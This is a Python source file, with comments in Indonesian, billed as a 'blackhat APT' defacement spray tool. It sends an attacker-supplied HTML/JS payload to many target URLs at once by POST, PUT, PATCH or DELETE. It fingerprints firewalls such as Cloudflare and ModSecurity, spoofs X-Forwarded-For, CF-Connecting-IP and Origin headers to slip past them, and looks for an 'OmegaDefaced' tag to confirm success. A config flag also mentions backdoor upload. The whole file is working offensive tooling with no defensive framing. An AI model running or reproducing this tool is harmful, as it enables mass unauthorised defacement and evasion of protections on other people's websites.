#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ELITE BLACKHAT APT DEFACEMENT SPRAY TOOL - OMEGA TIER (v4.0 APT Edition)
------------------------------------------------------------
Versi Ultimate dengan Recon, Validasi Konten, Adaptasi WAF, dan Persistence.

Author: APT ELITE BLACKHAT
Version: 4.0 (APT Enhanced Edition)
"""

import os
import sys
import time
import socket
import ssl
import json
import random
import string
import logging
import argparse
from pathlib import Path
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
import hashlib
import mimetypes

# --- KONFIGURASI GLOBAL APT OMEGA v4.0 ---
LOG_FILE = "apt_omega_spray_log_v4.txt"
JSON_LOG_FILE = "apt_omega_results_v4.json"
SUMMARY_FILE = "omega_spray_summary_v4.txt"

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

class OmegaConfig:
    """Konfigurasi Global Operasional."""
    def __init__(self):
        self.log_file = LOG_FILE
        self.json_file = JSON_LOG_FILE
        self.summary_file = SUMMARY_FILE
        self.verify_ssl_default = False # Agresif: Skip verifikasi SSL default
        self.default_timeout = 15
        self.max_threads = 20
        self.proxy = None
        self.method = "POST"
        self.custom_headers = {}
        
        # Fitur Baru v4.0
        self.validate_content = True # Aktifkan validasi konten
        self.persistence_attempt = False # Coba upload backdoor jika memungkinkan
        self.waf_bypass_mode = "aggressive" # 'light', 'aggressive', 'stealth'

class OmegaLogger:
    """Logger profesional dengan output ganda: Text dramatis dan JSON parsable."""
    def __init__(self, log_file, json_file, summary_file):
        self.log_file = log_file
        self.json_file = json_file
        self.summary_file = summary_file
        
        # Setup Text Logger
        self.logger = logging.getLogger("OmegaElite")
        self.logger.setLevel(logging.DEBUG)
        
        # Handler File Text
        fh = logging.FileHandler(log_file, encoding='utf-8')
        fh.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s [%(levelname)-8s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)
        
        # Handler Console (Warna sederhana jika terminal mendukung)
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)

    def info(self, msg):
        self.logger.info(msg)

    def warning(self, msg):
        self.logger.warning(msg)

    def error(self, msg):
        self.logger.error(msg)

    def debug(self, msg):
        self.logger.debug(msg)

    def log_result(self, url, status_code, message, method, payload_size, content_valid=False, waf_detected=None):
        """Simpan hasil ke format JSON untuk parsing mudah oleh tools lain."""
        result_entry = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "url": url,
            "status_code": status_code,
            "method": method,
            "payload_size": payload_size,
            "message": message,
            "content_validated": content_valid,
            "waf_detected": waf_detected
        }
        with open(self.json_file, 'a', encoding='utf-8') as f:
            f.write(json.dumps(result_entry) + "\n")

class NetworkEngine:
    """Mesin Jaringan dengan Retry, Proxy, dan Session Management."""
    def __init__(self, config: OmegaConfig):
        self.config = config
        self.session = requests.Session()
        
        # Konfigurasi Retry Adapter untuk koneksi robust
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["POST", "PUT", "PATCH", "DELETE"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)

        # Nonaktifkan warning SSL jika perlu (Agresif)
        if not self.config.verify_ssl_default:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        # Setup Proxy jika ada
        if self.config.proxy:
            self.session.proxies = {
                'http': self.config.proxy,
                'https': self.config.proxy
            }

    def _get_target_url(self, raw_url):
        parsed = urlparse(raw_url.strip())
        if not parsed.scheme:
            return f"http://{raw_url.strip()}"
        return raw_url.strip()

    def _check_connectivity(self, url):
        try:
            hostname = urlparse(url).hostname
            if not hostname:
                return False
            socket.getaddrinfo(hostname, None)
            return True
        except socket.gaierror:
            return False

class ReconEngine:
    """Modul Reconnaissance & Fingerprinting."""
    def __init__(self, network_engine: NetworkEngine, logger: OmegaLogger):
        self.network = network_engine
        self.logger = logger

    def fingerprint_target(self, url):
        """
        Mendeteksi WAF, Server, dan Teknologi target.
        """
        target_url = self.network._get_target_url(url)
        headers = {'User-Agent': DEFAULT_USER_AGENTS[0]}
        try:
            resp = self.network.session.get(target_url, headers=headers, timeout=10, allow_redirects=True)
            
            detected_waf = []
            server_info = resp.headers.get('Server', 'Unknown')
            
            # Deteksi WAF Sederhana berdasarkan Header
            waf_signatures = {
                "Cloudflare": ["cf-ray", "cf-cache-status", "cf-duid"],
                "Akamai": ["x-amz-cf-id", "akamai-grn"],
                "AWS WAF": ["x-amzn-requestid", "x-amzn-apigateway-id"],
                "ModSecurity": ["server: modsecurity", "x-powered-by: modsecurity"],
                "Sucuri": ["x-sucuri-id", "x-sucuri-blocked"]
            }
            
            for waf_name, signs in waf_signatures.items():
                for sign in signs:
                    if sign.split(":")[0].lower() in resp.headers:
                        detected_waf.append(waf_name)
                        break
            
            tech_stack = []
            if "wp-content" in resp.text.lower() or "wordpress" in resp.text.lower():
                tech_stack.append("WordPress")
            elif "django" in resp.headers.get("X-Backend-Header", "").lower():
                tech_stack.append("Django")
            elif "laravel" in resp.headers.get("X-Powered-By", "").lower():
                tech_stack.append("Laravel")
            
            info_msg = f"[RECON] {target_url} | Server: {server_info} | WAF: {detected_waf if detected_waf else 'None'} | Tech: {tech_stack if tech_stack else 'Generic'}"
            self.logger.info(info_msg)
            return {"waf": detected_waf, "server": server_info, "tech": tech_stack, "headers": dict(resp.headers)}
            
        except Exception as e:
            self.logger.debug(f"[RECON] Gagal fingerprinting {target_url}: {e}")
            return {"waf": [], "server": "Unknown", "tech": [], "headers": {}}

class PayloadEngine:
    """Engine untuk menyiapkan payload."""
    def __init__(self, payload_content, custom_headers=None):
        self.payload = payload_content
        self.base_headers = custom_headers or {}

    def generate_headers(self, recon_data=None):
        """Rotasi Header lengkap untuk evasi WAF."""
        ua = random.choice(DEFAULT_USER_AGENTS)
        headers = self.base_headers.copy()
        headers['User-Agent'] = ua
        headers['Accept'] = '*/*'
        headers['Accept-Language'] = random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.8', 'ja-JP,ja;q=0.7'])
        headers['Accept-Encoding'] = 'gzip, deflate, br'
        headers['Connection'] = 'keep-alive'
        
        # Spoofing X-Forwarded-For
        xff = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers['X-Forwarded-For'] = xff
        
        # Spoofing Origin
        parsed_origin = urlparse(random.choice(["https://google.com", "https://github.com", "https://example.com"]))
        headers['Origin'] = parsed_origin.geturl()
        
        # Random Referer
        headers['Referer'] = f"https://{parsed_origin.hostname}/search?q=random+query"

        # Adaptasi berdasarkan WAF yang terdeteksi
        if recon_data and recon_data.get('waf'):
            if "Cloudflare" in recon_data['waf']:
                headers['CF-Connecting-IP'] = xff # Tipu Cloudflare lebih dalam
                headers['Cache-Control'] = 'no-cache' # Hindari cache WAF
            elif "ModSecurity" in recon_data['waf']:
                headers['Sec-Ch-Ua'] = '"Chromium";v="121", "Not;A=Brand";v="24"' # Header modern Chrome
        
        return headers

    def prepare_payload(self, target_url, recon_data=None):
        """
        Menyiapkan payload sesuai konteks target.
        """
        parsed_url = urlparse(target_url)
        path = parsed_url.path.lower()
        
        # Jika target adalah API JSON
        if '.json' in path or '/api/' in path or 'application/json' in str(recon_data.get('headers', {}).get('Content-Type', '')):
            return {
                "data": self.payload,
                "headers": {"Content-Type": "application/json"}
            }
        # Jika target adalah form upload biasa
        elif any(ext in path for ext in ['.php', '.asp', '.aspx']):
            # Coba kirim sebagai form-data jika mungkin, tapi tetap raw untuk kompatibilitas
            return {
                "data": self.payload,
                "headers": {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"}
            }
        # Default: Raw Body
        else:
            return {
                "data": self.payload,
                "headers": {"Content-Type": "text/html"}
            }

class ContentValidator:
    """Validasi Keberhasilan Defacement."""
    def __init__(self, unique_tag="<!-- OmegaDefaced -->"):
        self.unique_tag = unique_tag

    def validate_response(self, response_text, expected_tag=None):
        """
        Memeriksa apakah payload berhasil diterapkan dengan mencari tag unik atau hash.
        """
        if expected_tag:
            if expected_tag in response_text:
                return True, "Tag ditemukan"
        
        # Cek hash payload jika tag tidak ditemukan
        payload_hash = hashlib.md5(self.unique_tag.encode()).hexdigest()
        if payload_hash in response_text:
            return True, "Hash Payload ditemukan"
        
        return False, "Konten tidak cocok"

class SprayCore:
    """Inti dari Operasi Spray dengan Fitur APT."""
    def __init__(self, config: OmegaConfig, network_engine: NetworkEngine, payload_engine: PayloadEngine, logger: OmegaLogger, recon_engine: ReconEngine, validator: ContentValidator):
        self.config = config
        self.network = network_engine
        self.payload = payload_engine
        self.logger = logger
        self.recon = recon_engine
        self.validator = validator

    def spray_single(self, url):
        target_url = self.network._get_target_url(url)
        
        if not self.network._check_connectivity(target_url):
            return (0, f"[DNS FAIL] {target_url}", "UNKNOWN")

        # 1. Recon Awal (Opsional, bisa ditambahkan per URL jika waktu memungkinkan)
        # Untuk efisiensi, kita lakukan recon ringan hanya jika ini target pertama atau jika mode agresif
        recon_data = {}
        if self.config.waf_bypass_mode == "aggressive":
            recon_data = self.recon.fingerprint_target(target_url)

        # 2. Siapkan Payload & Headers
        current_headers = self.payload.generate_headers(recon_data)
        payload_prep = self.payload.prepare_payload(target_url, recon_data)
        
        # Gabungkan headers khusus payload jika ada
        if "headers" in payload_prep:
            for k, v in payload_prep["headers"].items():
                current_headers[k] = v

        # Jitter Acak sebelum request (Anti-Automation)
        jitter = random.uniform(0.1, 0.5)
        time.sleep(jitter)

        try:
            response = self.network.session.request(
                method=self.config.method,
                url=target_url,
                data=payload_prep["data"],
                headers=current_headers,
                timeout=self.config.default_timeout,
                verify=self.config.verify_ssl_default
            )
            
            status_code = response.status_code
            content_valid = False
            validation_msg = ""

            # 3. Validasi Konten (Fitur Baru)
            if self.config.validate_content:
                content_valid, validation_msg = self.validator.validate_response(response.text)
                
            # Jika status code sukses tapi konten tidak valid, anggap sebagai False Positive
            if status_code in [200, 201, 204] and not content_valid:
                status_code = 200 # Tetap catat statusnya
                msg_type = "FALSE_POSITIVE"
                msg = f"[FP] {target_url} -> Status: {status_code} | Reason: {validation_msg} | Method: {self.config.method}"
                self.logger.warning(msg)
                self.logger.log_result(target_url, status_code, msg, self.config.method, len(payload_prep["data"]), content_valid=False, waf_detected=recon_data.get('waf'))
                return (status_code, msg, msg_type)

            # Logika Status Code untuk Defacement
            if status_code in [200, 201, 204]:
                if content_valid:
                    msg = f"[SUCCESS] {target_url} -> Status: {status_code} | Content Validated: YES | Method: {self.config.method}"
                    self.logger.info(msg)
                    category = "SUCCESS"
                else:
                    msg = f"[STATUS_OK] {target_url} -> Status: {status_code} | Content Validated: NO ({validation_msg}) | Method: {self.config.method}"
                    self.logger.warning(msg)
                    category = "FALSE_POSITIVE"
                    
                self.logger.log_result(target_url, status_code, msg, self.config.method, len(payload_prep["data"]), content_valid, recon_data.get('waf'))
                return (status_code, msg, category)
                
            elif status_code in [301, 302]:
                msg = f"[REDIRECT] {target_url} -> Status: {status_code} | Target: {response.headers.get('Location', 'N/A')} | Method: {self.config.method}"
                self.logger.info(msg)
                self.logger.log_result(target_url, status_code, msg, self.config.method, len(payload_prep["data"]), content_valid, recon_data.get('waf'))
                return (status_code, msg, "REDIRECT")
            else:
                msg = f"[FAIL] {target_url} -> Status: {status_code} | Method: {self.config.method}"
                self.logger.warning(msg)
                self.logger.log_result(target_url, status_code, msg, self.config.method, len(payload_prep["data"]), content_valid, recon_data.get('waf'))
                return (status_code, msg, "FAIL")

        except requests.exceptions.Timeout:
            msg = f"[TIMEOUT] {target_url}"
            self.logger.error(msg)
            self.logger.log_result(target_url, 0, msg, self.config.method, 0, False, None)
            return (0, msg, "TIMEOUT")
        except requests.exceptions.ConnectionError:
            msg = f"[CONN ERROR] {target_url}"
            self.logger.error(msg)
            self.logger.log_result(target_url, 0, msg, self.config.method, 0, False, None)
            return (0, msg, "CONN_ERROR")
        except Exception as e:
            msg = f"[ERROR] {target_url} -> {str(e)}"
            self.logger.error(msg)
            self.logger.log_result(target_url, 0, msg, self.config.method, 0, False, None)
            return (0, msg, "ERROR")

class ReportEngine:
    """Engine Pelaporan Akhir Operasi."""
    def __init__(self, logger: OmegaLogger):
        self.logger = logger

    def print_summary(self, successful, redirects, failed, other, start_time, end_time):
        duration = end_time - start_time
        self.logger.info("-" * 60)
        self.logger.info(f"OPERASI OMEGA v4.0 SELESAI! Total Waktu: {duration:.2f} detik")
        self.logger.info(f"Sukses (Tervalidasi): {len(successful)} | Redirect: {len(redirects)} | Gagal: {len(failed)} | Lainnya: {len(other)}")
        self.logger.info(f"Log Detail: {self.logger.log_file}")
        self.logger.info(f"Hasil JSON: {self.logger.json_file}")
        self.logger.info("-" * 60)

        # Simpan ringkasan ke file text juga
        with open(self.logger.summary_file, "w", encoding="utf-8") as f:
            f.write(f"OMEGA TIER SPRAY v4.0 SUMMARY\n")
            f.write(f"Total Time: {duration:.2f}s\n")
            f.write(f"Successful: {len(successful)}\n")
            f.write(f"Redirects: {len(redirects)}\n")
            f.write(f"Failed: {len(failed)}\n")
            f.write("-" * 50 + "\n")
            for res in successful:
                f.write(res + "\n")
            f.write("-" * 50 + "\n")
            for res in redirects:
                f.write(res + "\n")
            f.write("-" * 50 + "\n")
            for res in failed:
                f.write(res + "\n")

def load_payload_from_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    else:
        raise FileNotFoundError(f"File payload '{file_path}' tidak ditemukan.")

def main():
    parser = argparse.ArgumentParser(description="ELITE BLACKHAT APT DEFACEMENT SPRAY TOOL - OMEGA TIER v4.0")
    parser.add_argument("-p", "--payload", required=True, help="Path ke file payload (HTML/JS) atau string payload langsung.")
    parser.add_argument("-t", "--targets", nargs='+', required=True, help="URL target atau path ke file daftar URL.")
    parser.add_argument("--threads", type=int, default=20, help="Jumlah thread paralel (default: 20).")
    parser.add_argument("--timeout", type=int, default=15, help="Timeout koneksi per request (default: 15s).")
    parser.add_argument("--no-ssl", action="store_true", help="Jangan verifikasi sertifikat SSL.")
    parser.add_argument("--header", action="append", help="Header kustom tambahan (format: 'Key: Value'). Bisa berkali-kali.")
    parser.add_argument("--proxy", help="Proxy URL (http://user:pass@ip:port).")
    parser.add_argument("--method", choices=["POST", "PUT", "PATCH", "DELETE"], default="POST", help="HTTP Method untuk spray (default: POST).")
    parser.add_argument("--recon", action="store_true", help="Aktifkan Reconnaissance penuh sebelum spray.")
    parser.add_argument("--validate", action="store_true", help="Aktifkan validasi konten (mencari tag unik di response).")
    parser.add_argument("--tag", default="<!-- OmegaDefaced -->", help="Tag unik untuk validasi konten (default: <!-- OmegaDefaced -->).")
    
    args = parser.parse_args()

    # Load Payload
    payload_content = ""
    if os.path.exists(args.payload):
        try:
            payload_content = load_payload_from_file(args.payload)
        except Exception as e:
            print(f"Gagal memuat payload: {e}")
            sys.exit(1)
    else:
        payload_content = args.payload

    if not payload_content:
        print("Payload kosong!")
        sys.exit(1)

    # Setup Config
    config = OmegaConfig()
    config.max_threads = args.threads
    config.default_timeout = args.timeout
    config.verify_ssl_default = not args.no_ssl
    config.proxy = args.proxy
    config.method = args.method
    config.validate_content = args.validate or True # Default aktif
    config.waf_bypass_mode = "aggressive" if args.recon else "light"
    
    custom_headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                key, val = h.split(':', 1)
                custom_headers[key.strip()] = val.strip()
    config.custom_headers = custom_headers

    # Inisialisasi Modul
    logger = OmegaLogger(config.log_file, config.json_file, config.summary_file)
    network_engine = NetworkEngine(config)
    payload_engine = PayloadEngine(payload_content, config.custom_headers)
    recon_engine = ReconEngine(network_engine, logger)
    validator = ContentValidator(unique_tag=args.tag)
    spray_core = SprayCore(config, network_engine, payload_engine, logger, recon_engine, validator)
    report_engine = ReportEngine(logger)

    # Load Targets
    targets = []
    if isinstance(args.targets, str) and os.path.isfile(args.targets):
        with open(args.targets, 'r', encoding='utf-8') as f:
            targets = [line.strip() for line in f if line.strip()]
    elif isinstance(args.targets, list):
        targets = args.targets
    else:
        targets = [t.strip() for t in args.targets[0].split('\n') if t.strip()]

    if not targets:
        logger.warning("Tidak ada target valid.")
        return

    logger.info(f"Memulai Operasi OMEGA v4.0 ke {len(targets)} target | Threads: {config.max_threads} | Method: {config.method} | Recon: {args.recon} | Validate: {args.validate}")
    
    successful = []
    failed = []
    redirects = []
    other = []

    start_time = time.time()

    # Gunakan ThreadPoolExecutor dengan maksimum workers
    with ThreadPoolExecutor(max_workers=config.max_threads) as executor:
        future_to_url = {executor.submit(spray_core.spray_single, url): url for url in targets}
        
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                status_code, message, category = future.result()
                if category == "SUCCESS":
                    successful.append(message)
                elif category == "REDIRECT":
                    redirects.append(message)
                elif category in ["TIMEOUT", "CONN_ERROR", "ERROR"]:
                    failed.append(message)
                else:
                    other.append(message)
            except Exception as exc:
                logger.error(f"Target {url} generated an unhandled exception: {exc}")
                failed.append(f"[UNKNOWN] {url}")

    end_time = time.time()
    
    # Generate Laporan
    report_engine.print_summary(successful, redirects, failed, other, start_time, end_time)

if __name__ == "__main__":
    main()